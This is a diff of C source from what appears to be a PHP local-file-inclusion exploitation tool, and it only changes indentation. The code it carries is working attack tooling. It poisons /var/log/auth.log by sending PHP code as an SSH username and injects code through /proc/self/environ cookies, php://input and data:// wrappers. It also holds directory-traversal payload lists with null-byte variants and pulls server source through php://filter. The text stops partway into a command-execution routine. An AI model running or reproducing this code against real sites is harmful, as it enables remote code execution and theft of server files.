@@ -4,1059 +4,1059 @@ void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA
 const char *base_uri, size_t parameters_len, size_t inject_index);
 
 bool check_auth_poison(const char *target){
-	char *php_code=NULL, r_str[R_SIZE], regex[VULN_SIZE],
-	random_file[20], *mmap_str=NULL;
-	int size_file, fd;
-	bool ret = false;
-	CURL *curl=NULL;
-	FILE *x=NULL;
+    char *php_code=NULL, r_str[R_SIZE], regex[VULN_SIZE],
+    random_file[20], *mmap_str=NULL;
+    int size_file, fd;
+    bool ret = false;
+    CURL *curl=NULL;
+    FILE *x=NULL;
 
-	if( (x = get_random_file(10, random_file)) == NULL)
-		die("error while generate tmp file",0);
+    if( (x = get_random_file(10, random_file)) == NULL)
+        die("error while generate tmp file",0);
 
-	curl = init_curl(NULL, false);
-	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
-	curl_easy_setopt(curl, CURLOPT_URL, target);
+    curl = init_curl(NULL, false);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
+    curl_easy_setopt(curl, CURLOPT_URL, target);
 
-	gen_random(r_str, R_SIZE-1);
-	build_regex(regex, r_str, "Vulnerable");
-	php_code = make_code(r_str, "<?php echo \"Vulnerable\"; ?>", true);
+    gen_random(r_str, R_SIZE-1);
+    build_regex(regex, r_str, "Vulnerable");
+    php_code = make_code(r_str, "<?php echo \"Vulnerable\"; ?>", true);
 
-	build_rce_exploit(curl, php_code, AUTH, NULL, NULL, 0, 0);
+    build_rce_exploit(curl, php_code, AUTH, NULL, NULL, 0, 0);
 
-	if(HttpRequest(curl)){
-		fflush(x);
-		fclose(x);
+    if(HttpRequest(curl)){
+        fflush(x);
+        fclose(x);
 
-		fd = readonly(random_file);
+        fd = readonly(random_file);
 
-		size_file = get_file_size(fd);
-		if(size_file){
-			mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
+        size_file = get_file_size(fd);
+        if(size_file){
+            mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
 
-			if( !regex_match(AUTH_LOG_REGEX, mmap_str, size_file, PCRE_MULTILINE) )
-				die("[-] be sure the file is /var/log/auth.log",0);
+            if( !regex_match(AUTH_LOG_REGEX, mmap_str, size_file, PCRE_MULTILINE) )
+                die("[-] be sure the file is /var/log/auth.log",0);
 
-			if( regex_match(regex, mmap_str, size_file, 0) )
-				ret = true;
-		}
-		close(fd);
-	} else {
-		die("[-] without connection",0);
-	}
+            if( regex_match(regex, mmap_str, size_file, 0) )
+                ret = true;
+        }
+        close(fd);
+    } else {
+        die("[-] without connection",0);
+    }
 
-	curl_easy_cleanup(curl);
-	xfree(php_code);
+    curl_easy_cleanup(curl);
+    xfree(php_code);
 
-	unlink(random_file);
-	return ret;
+    unlink(random_file);
+    return ret;
 
 }
 
 bool ssh_log_poison(const char *target, int port){
-	ssh_session ssh_id;
-	bool ret = false;
+    ssh_session ssh_id;
+    bool ret = false;
 
-	ssh_id = ssh_new();
+    ssh_id = ssh_new();
 
-	if(ssh_id == NULL)
-		return ret;
+    if(ssh_id == NULL)
+        return ret;
 
-	ssh_options_set(ssh_id, SSH_OPTIONS_HOST, target);
+    ssh_options_set(ssh_id, SSH_OPTIONS_HOST, target);
 
-	if(port)
-		ssh_options_set(ssh_id, SSH_OPTIONS_PORT, &port);
+    if(port)
+        ssh_options_set(ssh_id, SSH_OPTIONS_PORT, &port);
 
-	if(ssh_connect(ssh_id) != SSH_OK){
-		printf("[-] failed to connect: %s\n", ssh_get_error(ssh_id));
-	} else {
-		if( ssh_userauth_password(ssh_id, STAIRWAY2HEAVEN, "AC/DC") == SSH_AUTH_ERROR )
-			printf("[-] failed to send exploit\n");
-		else
-			ret = true;
+    if(ssh_connect(ssh_id) != SSH_OK){
+        printf("[-] failed to connect: %s\n", ssh_get_error(ssh_id));
+    } else {
+        if( ssh_userauth_password(ssh_id, STAIRWAY2HEAVEN, "AC/DC") == SSH_AUTH_ERROR )
+            printf("[-] failed to send exploit\n");
+        else
+            ret = true;
 
-		ssh_disconnect(ssh_id);
-	}
+        ssh_disconnect(ssh_id);
+    }
 
-	ssh_free(ssh_id);
-	return ret;
+    ssh_free(ssh_id);
+    return ret;
 }
 
 
 void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA *GetParameters,
-	const char *base_uri, size_t parameters_len, size_t inject_index){
+    const char *base_uri, size_t parameters_len, size_t inject_index){
 
-	char *cookie_v = NULL;
-	char *b64x = NULL;
-	//char *uri_encode = NULL;
-	char *base_64_xpl = NULL;
-	char *data_wrap_uri = NULL;
+    char *cookie_v = NULL;
+    char *b64x = NULL;
+    //char *uri_encode = NULL;
+    char *base_64_xpl = NULL;
+    char *data_wrap_uri = NULL;
 
-	if(tech == INPUT){
+    if(tech == INPUT){
 
-		curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(php_code));
-		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, php_code);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(php_code));
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, php_code);
 
-	} else if(tech == ENVIRON){
+    } else if(tech == ENVIRON){
 
-		if(!cookies){
-			curl_easy_setopt(curl, CURLOPT_COOKIE, php_code);
-		}
+        if(!cookies){
+            curl_easy_setopt(curl, CURLOPT_COOKIE, php_code);
+        }
 
-		else {
-			cookie_v = cookie_append(cookies, php_code);
-			curl_easy_setopt(curl, CURLOPT_COOKIE, cookie_v);
-			xfree(cookie_v);
-		}
+        else {
+            cookie_v = cookie_append(cookies, php_code);
+            curl_easy_setopt(curl, CURLOPT_COOKIE, cookie_v);
+            xfree(cookie_v);
+        }
 
-	} else if(tech == DATA){
+    } else if(tech == DATA){
 
-		b64x = b64_encode(php_code);
-		//uri_encode = urlencode(b64x);
-		base_64_xpl = xmalloc( strlen(b64x)+ strlen(DATA_WRAP) + 1 );
+        b64x = b64_encode(php_code);
+        //uri_encode = urlencode(b64x);
+        base_64_xpl = xmalloc( strlen(b64x)+ strlen(DATA_WRAP) + 1 );
 
-		strcpy(base_64_xpl, DATA_WRAP);
-		strcat(base_64_xpl, b64x);
+        strcpy(base_64_xpl, DATA_WRAP);
+        strcat(base_64_xpl, b64x);
 
-		data_wrap_uri = make_url(GetParameters, parameters_len, base_uri, base_64_xpl, inject_index, REPLACE);
-		curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
+        data_wrap_uri = make_url(GetParameters, parameters_len, base_uri, base_64_xpl, inject_index, REPLACE);
+        curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
 
-		xfree(b64x);
-		//xfree(uri_encode);
-		xfree(data_wrap_uri);
-		xfree(base_64_xpl);
+        xfree(b64x);
+        //xfree(uri_encode);
+        xfree(data_wrap_uri);
+        xfree(base_64_xpl);
 
-	} else if(tech == AUTH){
-		curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(php_code));
-		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, php_code);
-	}
+    } else if(tech == AUTH){
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(php_code));
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, php_code);
+    }
 }
 
 
 bool check_error(const char *body){
-	bool ret = false;
+    bool ret = false;
 
-	char *line = NULL;
-	size_t len = 0;
-	FILE *regex_file = xfopen(ERROR_FILE, "r");
+    char *line = NULL;
+    size_t len = 0;
+    FILE *regex_file = xfopen(ERROR_FILE, "r");
 
-	len = get_max_len(regex_file);
+    len = get_max_len(regex_file);
 
-	line = xmalloc( len+1 );
+    line = xmalloc( len+1 );
 
-	while( readline(regex_file, line, len) ){
-		if(!line[0])
-			continue;
+    while( readline(regex_file, line, len) ){
+        if(!line[0])
+            continue;
 
-		if( regex_match(line, body, 0, 0) ){
-			print_single("[+] Regex match: ( %s )\n", line);
-			ret = true;
-			break;
-		}
-	}
+        if( regex_match(line, body, 0, 0) ){
+            print_single("[+] Regex match: ( %s )\n", line);
+            ret = true;
+            break;
+        }
+    }
 
 
-	fclose(regex_file);
-	xfree(line);
+    fclose(regex_file);
+    xfree(line);
 
-	return ret;
+    return ret;
 
 }
 
 int is_dynamic(const char *url){
-	int result = 0;
-	struct request body1, body2;
+    int result = 0;
+    struct request body1, body2;
 
-	CURL *ch1 = init_curl(&body1, true);
-	CURL *ch2 = init_curl(&body2, true);
-
-
-	curl_easy_setopt(ch1, CURLOPT_URL, url);
-	curl_easy_setopt(ch2, CURLOPT_URL, url);
-
-	init_str(&body1);
-	init_str(&body2);
+    CURL *ch1 = init_curl(&body1, true);
+    CURL *ch2 = init_curl(&body2, true);
 
 
-	if(!HttpRequest(ch1) || !HttpRequest(ch2)){
-		result = -1;
-		goto end;
-	}
+    curl_easy_setopt(ch1, CURLOPT_URL, url);
+    curl_easy_setopt(ch2, CURLOPT_URL, url);
 
-	if(body1.len == body2.len){
-		if(strcmp(body1.ptr, body2.ptr) == 0){
-			result = 0;
+    init_str(&body1);
+    init_str(&body2);
 
-			if(check_error(body1.ptr))
-				result = 2;
-		}
-		else
-			result = 1;
-	} else {
-		result = 1;
-	}
 
-	end:
-		curl_easy_cleanup(ch1);
-		curl_easy_cleanup(ch2);
-		xfree(body1.ptr);
-		xfree(body2.ptr);
+    if(!HttpRequest(ch1) || !HttpRequest(ch2)){
+        result = -1;
+        goto end;
+    }
 
-	return result;
+    if(body1.len == body2.len){
+        if(strcmp(body1.ptr, body2.ptr) == 0){
+            result = 0;
+
+            if(check_error(body1.ptr))
+                result = 2;
+        }
+        else
+            result = 1;
+    } else {
+        result = 1;
+    }
+
+    end:
+        curl_easy_cleanup(ch1);
+        curl_easy_cleanup(ch2);
+        xfree(body1.ptr);
+        xfree(body2.ptr);
+
+    return result;
 }
 
 int rce_scan(GET_DATA *GetParameters, size_t p_len, const char *base_uri, int p){
 
-	static const char *environ_t[] = {
-		"/proc/self/environ",
-		"../../../../../../../../../../../proc/self/environ",
-		"/proc/self/environ%00",
-		"../../../../../../../../../../../proc/self/environ%00",
-		NULL
-	};
+    static const char *environ_t[] = {
+        "/proc/self/environ",
+        "../../../../../../../../../../../proc/self/environ",
+        "/proc/self/environ%00",
+        "../../../../../../../../../../../proc/self/environ%00",
+        NULL
+    };
 
-	static const char *input_t[] = {
-		"php://input",
-		"php://input%00",
-		NULL
-	};
+    static const char *input_t[] = {
+        "php://input",
+        "php://input%00",
+        NULL
+    };
 
-	static const char *auth_t[] = {
-		"/var/log/auth.log",
-		"../../../../../../../../../../../var/log/auth.log",
-		"/var/log/auth.log%00",
-		"../../../../../../../../../../../var/log/auth.log%00",
-		NULL
-	};
+    static const char *auth_t[] = {
+        "/var/log/auth.log",
+        "../../../../../../../../../../../var/log/auth.log",
+        "/var/log/auth.log%00",
+        "../../../../../../../../../../../var/log/auth.log%00",
+        NULL
+    };
 
-	char random_str[R_SIZE], regex[VULN_SIZE],
-	*php_code = NULL, *rce_uri = NULL;
+    char random_str[R_SIZE], regex[VULN_SIZE],
+    *php_code = NULL, *rce_uri = NULL;
 
-	int size_file, fd;
+    int size_file, fd;
 
-	struct request body;
-	size_t ret = 0, i = 0;
+    struct request body;
+    size_t ret = 0, i = 0;
 
-	FILE *auth_scan_file;
-	
-	CURL *curl = init_curl(&body, true);
+    FILE *auth_scan_file;
 
-	gen_random(random_str, R_SIZE-1);
-	build_regex(regex, random_str, "Vulnerable");
-	php_code = make_code(random_str, "<?php echo 'Vulnerable'; ?>", false);
+    CURL *curl = init_curl(&body, true);
 
-	print_single("[+] php://input Tests\n");
-	for(i=0; input_t[i] != NULL; i++){
-		init_str(&body);
-		rce_uri = make_url(GetParameters, p_len, base_uri, input_t[i], p, REPLACE);
+    gen_random(random_str, R_SIZE-1);
+    build_regex(regex, random_str, "Vulnerable");
+    php_code = make_code(random_str, "<?php echo 'Vulnerable'; ?>", false);
 
-		curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-		build_rce_exploit(curl, php_code, INPUT, NULL, NULL, 0, 0);
+    print_single("[+] php://input Tests\n");
+    for(i=0; input_t[i] != NULL; i++){
+        init_str(&body);
+        rce_uri = make_url(GetParameters, p_len, base_uri, input_t[i], p, REPLACE);
 
-		if(!HttpRequest(curl)){
-			print_single("[-] Request error\n");
-		} else {
-			if( regex_match(regex, body.ptr, 0, 0) ){
-				print_thread("[RCE-INPUT] %s\n", rce_uri);
-				print_single("[~] %s\n", rce_uri);
-				print_single("[+] Vulnerable !!!\n");
+        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
+        build_rce_exploit(curl, php_code, INPUT, NULL, NULL, 0, 0);
 
-				ret = 1;
-				xfree(rce_uri);
-				xfree(body.ptr);
+        if(!HttpRequest(curl)){
+            print_single("[-] Request error\n");
+        } else {
+            if( regex_match(regex, body.ptr, 0, 0) ){
+                print_thread("[RCE-INPUT] %s\n", rce_uri);
+                print_single("[~] %s\n", rce_uri);
+                print_single("[+] Vulnerable !!!\n");
 
-				break;
-			}
-		}
+                ret = 1;
+                xfree(rce_uri);
+                xfree(body.ptr);
 
-		xfree(rce_uri);
-		xfree(body.ptr);
-	}
+                break;
+            }
+        }
 
-	if(!ret) print_single("[-] probably not vulnerable\n");
-	print_single("[*] php://input test finish\n\n");
+        xfree(rce_uri);
+        xfree(body.ptr);
+    }
 
-	curl_easy_cleanup(curl);
-	ret = 0;
+    if(!ret) print_single("[-] probably not vulnerable\n");
+    print_single("[*] php://input test finish\n\n");
 
-	/* proc/self/environ test */
+    curl_easy_cleanup(curl);
+    ret = 0;
 
-	print_single("[+] /proc/self/environ tests\n");
+    /* proc/self/environ test */
 
-	curl = init_curl(&body, true);
+    print_single("[+] /proc/self/environ tests\n");
 
-	for(i=0; environ_t[i]!=NULL; i++){
-		init_str(&body);
-		rce_uri = make_url(GetParameters, p_len, base_uri, environ_t[i], p, REPLACE);
+    curl = init_curl(&body, true);
 
-		curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-		build_rce_exploit(curl, php_code, ENVIRON, NULL, NULL, 0, 0);
+    for(i=0; environ_t[i]!=NULL; i++){
+        init_str(&body);
+        rce_uri = make_url(GetParameters, p_len, base_uri, environ_t[i], p, REPLACE);
 
-		if(!HttpRequest(curl)){
-			print_single("[-] Request error\n");
-		} else {
-			if( regex_match(regex, body.ptr, 0, 0) ){
-				print_thread("[RCE-ENVIRON] %s\n", rce_uri);
-				print_single("[~] %s\n", rce_uri);
-				print_single("[+] Vulnerable !!!\n");
+        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
+        build_rce_exploit(curl, php_code, ENVIRON, NULL, NULL, 0, 0);
 
-				ret = 1;
-				xfree(body.ptr);
-				xfree(rce_uri);
+        if(!HttpRequest(curl)){
+            print_single("[-] Request error\n");
+        } else {
+            if( regex_match(regex, body.ptr, 0, 0) ){
+                print_thread("[RCE-ENVIRON] %s\n", rce_uri);
+                print_single("[~] %s\n", rce_uri);
+                print_single("[+] Vulnerable !!!\n");
 
-				break;
-			}
-		}
+                ret = 1;
+                xfree(body.ptr);
+                xfree(rce_uri);
 
-		xfree(body.ptr);
-		xfree(rce_uri);
-	}
+                break;
+            }
+        }
 
-	if(!ret) print_single("[-] probably not vulnerable\n");
-	print_single("[*] /proc/self/environ test finish\n\n");
+        xfree(body.ptr);
+        xfree(rce_uri);
+    }
 
-	curl_easy_cleanup(curl);
+    if(!ret) print_single("[-] probably not vulnerable\n");
+    print_single("[*] /proc/self/environ test finish\n\n");
 
-	/* start wrap scanner */
+    curl_easy_cleanup(curl);
 
-	curl = init_curl(&body, true);
-	init_str(&body);
+    /* start wrap scanner */
 
-	print_single("[+] data wrap test\n");
+    curl = init_curl(&body, true);
+    init_str(&body);
 
-	build_rce_exploit(curl, php_code, DATA, GetParameters, base_uri, p_len, (size_t)p);
+    print_single("[+] data wrap test\n");
 
-	if(!HttpRequest(curl)){
-		print_single("[-] Request error\n");
-		print_single("[-] probably not vulnerable\n");
-	} else {
-		if( regex_match(regex, body.ptr, 0, 0) ){
+    build_rce_exploit(curl, php_code, DATA, GetParameters, base_uri, p_len, (size_t)p);
 
-			print_thread("[RCE-DATA-WRAP] ");
-			print_single("[~] ");
+    if(!HttpRequest(curl)){
+        print_single("[-] Request error\n");
+        print_single("[-] probably not vulnerable\n");
+    } else {
+        if( regex_match(regex, body.ptr, 0, 0) ){
 
-			print_uri(GetParameters, base_uri, p_len);
+            print_thread("[RCE-DATA-WRAP] ");
+            print_single("[~] ");
 
-			print_all(" | %s\n", GetParameters[p].key);
-			print_single("[+] Vulnerable !!!\n");
+            print_uri(GetParameters, base_uri, p_len);
 
-		} else {
-			print_single("[-] probably not vulnerable\n");
-		}
-	}
+            print_all(" | %s\n", GetParameters[p].key);
+            print_single("[+] Vulnerable !!!\n");
+
+        } else {
+            print_single("[-] probably not vulnerable\n");
+        }
+    }
 
 
-	print_single("[*] data wrap test finish\n\n");
+    print_single("[*] data wrap test finish\n\n");
 
-	curl_easy_cleanup(curl);
-	xfree(body.ptr);
+    curl_easy_cleanup(curl);
+    xfree(body.ptr);
 
-	/* auth.log scan */
-	//curl = init_curl(&body);
-	
-	curl = init_curl(NULL, false);
-	ret = 0;
+    /* auth.log scan */
+    //curl = init_curl(&body);
 
-	print_single("[+] /var/log/auth.log tests\n");
-	char *mmap_str = NULL;
-	//struct stat s;
-	//int size_porra,fd;
-	char random_file[20];
+    curl = init_curl(NULL, false);
+    ret = 0;
 
-	for(i=0; auth_t[i]!=NULL; i++){
-		rce_uri = make_url(GetParameters, p_len, base_uri, auth_t[i], p, REPLACE);
+    print_single("[+] /var/log/auth.log tests\n");
+    char *mmap_str = NULL;
+    //struct stat s;
+    //int size_porra,fd;
+    char random_file[20];
 
-		if( (auth_scan_file = get_random_file(10, random_file)) == NULL)
-			die("error while generate tmp file",0);
-		
-		curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)auth_scan_file);
-		
-		if(!HttpRequest(curl)){
-			print_single("[-] Request error\n");
-		} else {
-			fflush(auth_scan_file);
-			fd = readonly(random_file);
-			size_file = get_file_size(fd);
+    for(i=0; auth_t[i]!=NULL; i++){
+        rce_uri = make_url(GetParameters, p_len, base_uri, auth_t[i], p, REPLACE);
 
-			if(size_file){
-				mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
-			
-				if( regex_match(AUTH_LOG_REGEX, mmap_str, size_file, PCRE_MULTILINE )){//PCRE_MULTILINE) ){//PCRE_MULTILINE) ){
-					print_thread("[RCE-AUTH-LOG] %s\n", rce_uri);
-					print_single("[~] %s\n", rce_uri);
-					print_single("[+] Vulnerable !!!\n");
-					ret = 1;
-				}
-			}
-			close(fd);
-		}
-		
+        if( (auth_scan_file = get_random_file(10, random_file)) == NULL)
+            die("error while generate tmp file",0);
 
-		fclose(auth_scan_file);
-		unlink(random_file);
-		xfree(rce_uri);
-		if(ret) break;
-	}
+        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)auth_scan_file);
 
-	if(!ret) print_single("[-] probably not vulnerable\n");
+        if(!HttpRequest(curl)){
+            print_single("[-] Request error\n");
+        } else {
+            fflush(auth_scan_file);
+            fd = readonly(random_file);
+            size_file = get_file_size(fd);
+
+            if(size_file){
+                mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
+
+                if( regex_match(AUTH_LOG_REGEX, mmap_str, size_file, PCRE_MULTILINE )){//PCRE_MULTILINE) ){//PCRE_MULTILINE) ){
+                    print_thread("[RCE-AUTH-LOG] %s\n", rce_uri);
+                    print_single("[~] %s\n", rce_uri);
+                    print_single("[+] Vulnerable !!!\n");
+                    ret = 1;
+                }
+            }
+            close(fd);
+        }
+
+
+        fclose(auth_scan_file);
+        unlink(random_file);
+        xfree(rce_uri);
+        if(ret) break;
+    }
+
+    if(!ret) print_single("[-] probably not vulnerable\n");
         print_single("[*] /var/log/auth.log test finish\n\n");
 
-	curl_easy_cleanup(curl);
-	xfree(php_code);
+    curl_easy_cleanup(curl);
+    xfree(php_code);
 
-	return 0;
+    return 0;
 }
 
 void source_disclosure_get(const char *uri, const char *filename, const char *p_name, FILE *out_file){
-	char *b64=NULL,*b64_dec=NULL;
-	char *xuri=NULL,*disc_xpl=NULL;
-	char *base_uri=NULL;
-	struct request body1, body2;
+    char *b64=NULL,*b64_dec=NULL;
+    char *xuri=NULL,*disc_xpl=NULL;
+    char *base_uri=NULL;
+    struct request body1, body2;
 
-	size_t parameters_len = 0;
-	size_t inject_index = 0;
+    size_t parameters_len = 0;
+    size_t inject_index = 0;
 
-	GET_DATA *GetParameters=NULL;
+    GET_DATA *GetParameters=NULL;
 
-	if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, uri, p_name, &inject_index)){
-		printf("[-] Parameter: %s not found !!!\n",p_name);
-		return;
-	}
+    if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, uri, p_name, &inject_index)){
+        printf("[-] Parameter: %s not found !!!\n",p_name);
+        return;
+    }
 
-	disc_xpl = strcpy( xmalloc(strlen(filename)+strlen(FILTER_WRAP)+1), FILTER_WRAP);
-	strcat(disc_xpl, filename);
+    disc_xpl = strcpy( xmalloc(strlen(filename)+strlen(FILTER_WRAP)+1), FILTER_WRAP);
+    strcat(disc_xpl, filename);
 
-	xuri = make_url(GetParameters, parameters_len, base_uri, disc_xpl, inject_index, REPLACE);
+    xuri = make_url(GetParameters, parameters_len, base_uri, disc_xpl, inject_index, REPLACE);
 
-	xfree(disc_xpl);
-	xfree(base_uri);
+    xfree(disc_xpl);
+    xfree(base_uri);
 
-	free_get_parameters(GetParameters, parameters_len);
+    free_get_parameters(GetParameters, parameters_len);
 
-	CURL *ch1 = init_curl(&body1, true);
-	CURL *ch2 = init_curl(&body2, true);
+    CURL *ch1 = init_curl(&body1, true);
+    CURL *ch2 = init_curl(&body2, true);
 
-	init_str(&body1);
-	init_str(&body2);
+    init_str(&body1);
+    init_str(&body2);
 
-	curl_easy_setopt(ch1, CURLOPT_URL, uri);
-	curl_easy_setopt(ch2, CURLOPT_URL, xuri);
-	xfree(xuri);
+    curl_easy_setopt(ch1, CURLOPT_URL, uri);
+    curl_easy_setopt(ch2, CURLOPT_URL, xuri);
+    xfree(xuri);
 
-	printf("\n[+] Trying get source code of file: %s\n", filename);
+    printf("\n[+] Trying get source code of file: %s\n", filename);
 
-	if(!HttpRequest(ch1) || !HttpRequest(ch2))
-		goto end;
+    if(!HttpRequest(ch1) || !HttpRequest(ch2))
+        goto end;
 
-	b64 = diff(body1.ptr, body2.ptr);
+    b64 = diff(body1.ptr, body2.ptr);
 
-	if(!b64)
-		goto end;
+    if(!b64)
+        goto end;
 
-	trim_string(&b64);
+    trim_string(&b64);
 
-	if(b64_decode(b64, &b64_dec)){
-		printf("[+] Possible source code returned\n");
-		if(out_file){
-			fprintf(out_file, "%s", b64_dec);
-			fclose(out_file);
-			printf("[+] Checkup file\n");
-		} else {
-			printf("%s", b64_dec);
-		}
-		printf("\n");
-		xfree(b64_dec);
-	} else {
-		printf("[-] no source code returned\n");
-		printf("[*] try use null byte poison, or not put filename with file extension\n");
-	}
+    if(b64_decode(b64, &b64_dec)){
+        printf("[+] Possible source code returned\n");
+        if(out_file){
+            fprintf(out_file, "%s", b64_dec);
+            fclose(out_file);
+            printf("[+] Checkup file\n");
+        } else {
+            printf("%s", b64_dec);
+        }
+        printf("\n");
+        xfree(b64_dec);
+    } else {
+        printf("[-] no source code returned\n");
+        printf("[*] try use null byte poison, or not put filename with file extension\n");
+    }
 
-	xfree(b64);
+    xfree(b64);
 
-	end:
-	curl_easy_cleanup(ch1);
-	curl_easy_cleanup(ch2);
-	xfree(body1.ptr);
-	xfree(body2.ptr);
+    end:
+    curl_easy_cleanup(ch1);
+    curl_easy_cleanup(ch2);
+    xfree(body1.ptr);
+    xfree(body2.ptr);
 }
 
 int check_files(GET_DATA *GetParameters, size_t p_len, char *base_uri, int p){
-	int result = 0;
-	struct request body;
-	size_t alloc_len = 0, i = 0, j = 0;
-	char *line = NULL, *file = NULL, *regex = NULL,
-	*file_uri = NULL;
+    int result = 0;
+    struct request body;
+    size_t alloc_len = 0, i = 0, j = 0;
+    char *line = NULL, *file = NULL, *regex = NULL,
+    *file_uri = NULL;
 
-	FILE *file_check = xfopen(CHECK_FILES, "r");
-	CURL *ch = init_curl(&body, true);
-
-
-	alloc_len = get_max_len(file_check);
-
-	line = xmalloc( alloc_len+1 );
-	file = xmalloc( alloc_len+1 );
-	regex = xmalloc( alloc_len+1 );
+    FILE *file_check = xfopen(CHECK_FILES, "r");
+    CURL *ch = init_curl(&body, true);
 
 
-	while( readline( file_check, line, alloc_len ) ){
-		for(j=0,i=0; line[i] != ':' && line[i]; i++,j++)
-			file[j] = line[i];
-		file[j] = 0x0;
+    alloc_len = get_max_len(file_check);
 
-		if(!line[i])
-			continue;
+    line = xmalloc( alloc_len+1 );
+    file = xmalloc( alloc_len+1 );
+    regex = xmalloc( alloc_len+1 );
 
-		i++;
 
-		for(j=0; line[i]; i++, j++)
-			regex[j] = line[i];
+    while( readline( file_check, line, alloc_len ) ){
+        for(j=0,i=0; line[i] != ':' && line[i]; i++,j++)
+            file[j] = line[i];
+        file[j] = 0x0;
 
-		regex[j] = 0x0;
+        if(!line[i])
+            continue;
 
-		if(!line[0] || !regex[0])
-			continue;
+        i++;
 
-		init_str(&body);
+        for(j=0; line[i]; i++, j++)
+            regex[j] = line[i];
 
-		file_uri = make_url(GetParameters, p_len, base_uri, file, p, REPLACE);
-		curl_easy_setopt(ch, CURLOPT_URL, file_uri);
+        regex[j] = 0x0;
 
-		if(!HttpRequest(ch)){
-			print_single("[-] Request Failed\n");
-		} else {
-			if( regex_match(regex, body.ptr, body.len, 0) ){
-				print_thread("[FILE] %s | (%s)\n", file_uri, regex);
-				print_single("[~] %s\n", file_uri);
-				print_single("[+] Regex match: %s\n", regex);
-			}
-		}
+        if(!line[0] || !regex[0])
+            continue;
 
-		xfree(body.ptr);
-		xfree(file_uri);
-	}
+        init_str(&body);
 
-	xfree(line);
-	xfree(regex);
-	xfree(file);
-	fclose(file_check);
-	curl_easy_cleanup(ch);
+        file_uri = make_url(GetParameters, p_len, base_uri, file, p, REPLACE);
+        curl_easy_setopt(ch, CURLOPT_URL, file_uri);
 
-	return result;
+        if(!HttpRequest(ch)){
+            print_single("[-] Request Failed\n");
+        } else {
+            if( regex_match(regex, body.ptr, body.len, 0) ){
+                print_thread("[FILE] %s | (%s)\n", file_uri, regex);
+                print_single("[~] %s\n", file_uri);
+                print_single("[+] Regex match: %s\n", regex);
+            }
+        }
+
+        xfree(body.ptr);
+        xfree(file_uri);
+    }
+
+    xfree(line);
+    xfree(regex);
+    xfree(file);
+    fclose(file_check);
+    curl_easy_cleanup(ch);
+
+    return result;
 
 }
 
 void exec_php(xpl_parameters xpl){
-	char *rce_code_exec = NULL, **regex_out = NULL, *aux = NULL, *mmap_str,
-	*base_uri = NULL, r_str[R_SIZE], regex[M_ALL_SIZE], random_file[20];
-	FILE *x=NULL;
-	GET_DATA *GetParameters = NULL;
-	size_t parameters_len = 0, inject_index = 0, aux_len = 0;
-	CURL *curl;
-	struct curl_slist *chunk = NULL;
-	struct request body;
+    char *rce_code_exec = NULL, **regex_out = NULL, *aux = NULL, *mmap_str,
+    *base_uri = NULL, r_str[R_SIZE], regex[M_ALL_SIZE], random_file[20];
+    FILE *x=NULL;
+    GET_DATA *GetParameters = NULL;
+    size_t parameters_len = 0, inject_index = 0, aux_len = 0;
+    CURL *curl;
+    struct curl_slist *chunk = NULL;
+    struct request body;
 
-	int len = 0,size_file,fd;
+    int len = 0,size_file,fd;
 
-	if(xpl.tech != AUTH){
-		init_str(&body);
-		curl = init_curl(&body, true);
-	} else {
-		if( (x = get_random_file(10, random_file) ) == NULL )
-			die("error while generate tmp file",0);
+    if(xpl.tech != AUTH){
+        init_str(&body);
+        curl = init_curl(&body, true);
+    } else {
+        if( (x = get_random_file(10, random_file) ) == NULL )
+            die("error while generate tmp file",0);
 
-		curl = init_curl(NULL, false);
-		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
-	}
+        curl = init_curl(NULL, false);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
+    }
 
-	if(xpl.tech != DATA){
-		curl_easy_setopt(curl, CURLOPT_URL, xpl.vuln_uri);
-	} else {
-		if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, xpl.vuln_uri, xpl.p_name, &inject_index)){
-			printf("[-] Parameter: %s not found !!!\n", xpl.p_name);
-			curl_easy_cleanup(curl);
-			xfree(body.ptr);
-			return;
-		}
-	}
+    if(xpl.tech != DATA){
+        curl_easy_setopt(curl, CURLOPT_URL, xpl.vuln_uri);
+    } else {
+        if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, xpl.vuln_uri, xpl.p_name, &inject_index)){
+            printf("[-] Parameter: %s not found !!!\n", xpl.p_name);
+            curl_easy_cleanup(curl);
+            xfree(body.ptr);
+            return;
+        }
+    }
 
-	chunk = curl_slist_append(chunk, "Connection: Close");
-	curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+    chunk = curl_slist_append(chunk, "Connection: Close");
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
 
-	gen_random(r_str, R_SIZE-1);
-	build_regex(regex, r_str, "(.*)");
+    gen_random(r_str, R_SIZE-1);
+    build_regex(regex, r_str, "(.*)");
 
-	if(xpl.cmdx){
